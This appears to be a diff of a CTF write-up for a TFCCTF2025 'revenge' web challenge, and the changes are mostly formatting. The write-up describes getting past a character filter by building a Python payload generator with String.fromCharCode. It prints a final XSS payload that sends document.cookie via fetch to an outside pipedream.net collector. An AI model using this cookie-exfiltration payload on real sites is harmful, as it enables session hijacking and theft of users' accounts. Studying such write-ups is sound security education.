@@ -8,6 +8,8 @@ For the revenge challenge there is not much changed but, but filtering got harde
 
 
 This is the new app.py
+
+
 ```py
 lookup = TemplateLookup(directories=[os.path.dirname(__file__)], module_directory=MODULE_DIR)
 
@@ -94,6 +96,8 @@ As we can see now can't use the html encoding since # is blocked and it's not in
 What we can do is injecting script tag then use String.fromCharCode to decode that banned characters.
 
 <br />
+
+
 ```py
 def create_map(banned):
     return {
@@ -129,9 +133,10 @@ final_payload = generate_payload(payload, banned)
 print(final_payload)
 
 ```
+
 <br />
 
-Final payload
+Final payload:
 
 ```
 ${banned[1]}Script${banned[2]}fetch${banned[3]}'http'+String['fromCharCode']${banned[3]}115${banned[4]}+'://eogce8tgujfgk5f'+String['fromCharCode']${banned[3]}46${banned[4]}+'m'+String['fromCharCode']${banned[3]}46${banned[4]}+'pipedream'+String['fromCharCode']${banned[3]}46${banned[4]}+'net/?q'+String['fromCharCode']${banned[3]}61${banned[4]}+''+document['cookie']${banned[4]}${banned[1]}/Script${banned[2]}
@@ -139,9 +144,13 @@ ${banned[1]}Script${banned[2]}fetch${banned[3]}'http'+String['fromCharCode']${ba
 
 reporting to admin
 
-<img src=https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/10.png>
-<br />
-<img src=https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/11.png>
+<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/10.png'>
+
 <br />
 
-https://tenor.com/view/ez-yann-gauthier-gif-18979624
+<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/11.png'>
+
+<br />
+
+
+<img src="https://tenor.com/view/ez-yann-gauthier-gif-18979624">
